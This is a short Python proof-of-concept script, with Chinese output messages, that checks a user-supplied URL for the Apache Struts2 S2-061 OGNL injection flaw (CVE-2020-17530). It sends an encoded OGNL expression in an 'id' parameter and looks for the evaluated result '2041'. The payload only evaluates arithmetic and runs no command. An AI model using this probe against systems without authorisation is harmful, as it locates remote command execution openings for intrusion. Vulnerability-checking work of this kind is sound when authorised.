import requests
import argparse
import os
def url():
		parser = argparse.ArgumentParser(description='Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）POC')
		parser.add_argument('target_url',type=str,help='The target address,example: http://192.168.140.153:8848')
		args = parser.parse_args()
		global url
		url = args.target_url
		#检测输入的url的正确性
		if url.startswith('http://') or url.startswith('https://'):
			pass
		else:
			print('[-]Please include http:// or https:// in the URL!!')
			os._exit(0)
		if url.endswith('/'):
			url = url[:-1]
		print('[+]author:chenchen')
		print("[-]Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）POC",)
		print("[-]开始执行检测...")
		print("[-]目标地址:",url)
		return url
def poc():
	headers={
		'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36'
	}
	vul_url = url + '/?id=%25%7b+%27test%27+%2b+(2021+%2b+20).toString()%7d'
	try:
		text = requests.get(vul_url,headers=headers,timeout=10).text
		if '2041' in text:
			print('[+]漏洞存在')
		else:
			print('[-]漏洞不存在')
	except:
		print('[-]发生错误')
if __name__ == '__main__':
	url()
	poc()